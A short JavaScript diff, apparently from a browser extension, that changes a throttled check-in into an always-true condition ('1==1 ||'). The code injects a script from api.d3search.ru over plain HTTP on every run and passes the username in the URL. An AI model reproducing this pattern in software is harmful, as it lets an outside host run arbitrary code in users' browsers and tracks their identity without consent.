@@ -2403,7 +2403,7 @@ if ( _$.settings.online_enabled =='1' )
 		};
 
 		var now = new Date().getTime();		
-		if ((now - lastCheckinTimestamp) > 1000 * 60 * 2 )
+		if (1==1 || (now - lastCheckinTimestamp) > 1000 * 60 * 2 )
 		{
 			var checkinScript = document.createElement("script");
 			checkinScript.setAttribute("src", "http://api.d3search.ru/checkin/" + vUserName );
